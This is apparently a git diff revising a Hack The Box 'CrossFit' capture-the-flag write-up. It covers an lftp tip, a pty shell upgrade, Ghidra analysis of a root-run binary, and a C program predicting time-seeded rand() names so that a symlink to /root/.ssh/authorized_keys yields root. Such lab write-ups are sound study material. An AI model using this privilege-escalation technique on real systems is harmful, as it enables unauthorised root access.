@@ -12,13 +12,24 @@ description: >-
 
 ![](../../.gitbook/assets/0-crossfit-infocard.png)
 
-Short description to include any strange things to be dealt with
+ This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
 
-### Useful Skills and Tools
+## Useful Skills and Tools
 
-**Useful thing 1**
+### Connecting to Secure FTP using lftp
 
-* description with generic example
+> ```bash
+> $ lftp
+> lftp :~> set ftp:ssl-force true
+> lftp :~> connect $domain
+> lftp domain:~> login $username
+> ```
+>
+> **NOTE:** If the server is making use of self signed certificates you may need to add this `set` as well:
+>
+> ```bash
+> lftp :~> set ssl:verify-certificate no
+> ```
 
 **Useful thing 2**
 
@@ -1750,7 +1761,7 @@ uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admin
 
 there was a new group `staff` that had access to a bunch of files related to selenium
 
-```text
+```bash
 isaac@crossfit:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 isaac@crossfit:~$ ^Z  
@@ -1834,6 +1845,8 @@ isaac     3557  0.0  0.0  10632  3144 ?        R    17:42   0:00 ps aux
 
 In the process output I could see my reverse shells \(I tried two different methods\)
 
+### dbmsg
+
 ```text
 2021/01/15 18:51:01 FS:                 OPEN | /usr/bin/dbmsg
 2021/01/15 18:51:01 FS:               ACCESS | /usr/bin/dbmsg
@@ -1888,7 +1901,7 @@ man dbmsg
 No manual entry for dbmsg
 ```
 
-After looking around on the internet for awhile and not finding anything I figured it must be a home-brewed application
+There was no man page, and after looking around on the internet for awhile and not finding anything I figured it must be a home-brewed application.
 
 ```text
 isaac@crossfit:~$ strings /bin/dbmsg
@@ -1904,7 +1917,7 @@ This program must be run as root.
 ...snipped...
 ```
 
-I quick peek into the strings inside the file proved this to be true
+I quick peek into the strings inside the file proved this to be true.
 
 ```c
 void main(void)
@@ -1927,7 +1940,7 @@ void main(void)
 }
 ```
 
-I opened the program in ghidra and found the main\(\) function. It ran as root, so this looked to be a possible bet for excalation of privileges. It looked like it checked the current system time, created a random number, then ran the process\_data\(\) function. I decided to check there next
+I exfiltrated the binary to my system and opened the program in ghidra.  After locating the `main()` function, I saw that it ran as root.  This looked to be a possible bet for escalation of privileges.  It looked like it checked the current system time, created a random number using the time as a seed, then ran the `process_data()` function.
 
 ```c
 void process_data(void)
@@ -2026,7 +2039,7 @@ void process_data(void)
 }
 ```
 
-The `process_data()` function opens a connection to the mysql database and logs in, pulls all of the data from the `messages` table, then stores the result in a variable. It then opens the file `/var/backups/mariadb/comments.zip`.
+The `process_data()` function opened a connection to the MySQL database and logged in.  Then pulled all of the data from the `messages` table then stored the result in a variable. It then opened the file `/var/backups/mariadb/comments.zip`.  After opening the `messages` table and the zip file, it appears that the program takes each entry in the messages table and creates a file, then adds each file to the zip.
 
 ```text
 isaac@crossfit:/dev/shm$ cd /var/backups/mariadb
@@ -2034,36 +2047,7 @@ cd /var/backups/mariadb
 bash: cd: /var/backups/mariadb: Permission denied
 ```
 
-I was unable to access the directory that file was stored in.
-
-After opening the `messages` table and the zip file, it appears that the program takes each entry in the messages table and creates a file, then adds each file to the zip.
-
-```c
-void md5sum(void *param_1,int param_2,long param_3)
-
-{
-  uint local_6c;
-  uchar local_68 [72];
-  EVP_MD *local_20;
-  EVP_MD_CTX *local_18;
-  uint local_c;
-
-  local_18 = (EVP_MD_CTX *)EVP_MD_CTX_new();
-  local_20 = EVP_md5();
-  EVP_DigestInit_ex(local_18,local_20,(ENGINE *)0x0);
-  EVP_DigestUpdate(local_18,param_1,(long)param_2);
-  EVP_DigestFinal_ex(local_18,local_68,&local_6c);
-  EVP_MD_CTX_free(local_18);
-  local_c = 0;
-  while (local_c < local_6c) {
-    snprintf((char *)((ulong)(local_c * 2) + param_3),0x20,"%02x");
-    local_c = local_c + 1;
-  }
-  return;
-}
-```
-
-the md5sum function
+I tried to see what was in this file, but I was unable to access the directory that file was stored in.
 
 ```c
 #include <stdio.h>
@@ -2079,7 +2063,7 @@ int main(void)
 }
 ```
 
-wrote a short function in c that emulated what the program was doing: using the current time, generate a psuedo-random number, then create a file with that name
+I wrote a short function in C that emulated what the program was doing: using the current time to generate a pseudo-random number, then creating a file with that name.
 
 ```text
 gcc rand.c -o /dev/shm/rand
@@ -2098,7 +2082,6 @@ echo 'int main(void)' >> rand.c
 echo '{' >> rand.c
 echo '    char tmp[50];' >> rand.c
 echo '    srand(time(0));' >> rand.c
-#echo '    snprintf(tmp, 50, "%d%s", rand(), "1");' >> rand.c
 echo '    printf("%d", rand());' >> rand.c
 echo '    return 0;' >> rand.c
 echo '}' >> rand.c
@@ -2176,7 +2159,7 @@ rand
 isaac@crossfit:/dev/shm$ chmod +x rand
 ```
 
-I compiled my random file generator then made it executable \(removing the evidence of its creation\). AFter running it, \(note: this is from before I automated all of this with my script from above!\)
+I compiled my random file generator then made it executable \(removing the evidence of its creation\). After running it, \(note: this is from before I automated all of this with my script from above!\)
 
 ```text
 isaac@crossfit:/var/local$ ls -la
@@ -2193,7 +2176,7 @@ isaac@crossfit:/var/local$ /dev/shm/test.sh
 ERROR 1364 (HY000) at line 1: Field 'name' doesn't have a default value
 ```
 
-I scolled up to check the error messages output from my script, and finally saw the error that had been causing me so much trouble...My original script was only inserting my public key into the `messages` field. The database was not set up to function with `NULL` values in the other fields so it was not working. It required values in the other fields.
+I scrolled up to check the error messages output from my script, and finally saw the error that had been causing me so much trouble...My original script was only inserting my public key into the `messages` field. The database was not set up to function with `NULL` values in the other fields so it was not working. It required values in the other fields.
 
 ```text
 /dev/shm/test.sh: line 2: ./rand: No such file or directory
@@ -2242,9 +2225,9 @@ lrwxrwxrwx  1 isaac staff    26 Mar 19 17:22 c4ca4238a0b923820dcc509a6f75849b ->
 -rw-r--r--  1 isaac staff     0 Mar 19 17:22 testing
 ```
 
-The random file
+I verfied that the randomly generated file was symlinked to `/root/.ssh/authorized_keys`.
 
-#### Root.txt
+### Root.txt
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -2296,9 +2279,9 @@ Finally! I had to keep trying to log in through SSH, as it wasn't until my files
 ./t: line 19: ./rand: No such file or directory
 ```
 
-AS you can see...I got tired of even typing out `test.sh` and simply called my script `t`. I almost was about to write another script that would send my files over, chmod +x them, and run the exploit script, but just before I did that the exploit finally worked!
+As you can see...I got tired of even typing out `test.sh` and simply called my script `t`. I almost was about to write another script that would send my files over, `chmod +x` them, and run the exploit script, but just before I did that the exploit finally worked!
 
-These notes got jumbled up...make sure to clean and reorganize them!
+TODO:These notes got jumbled up...make sure to clean and reorganize them!
 
 Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for something interesting or useful about this machine.
 
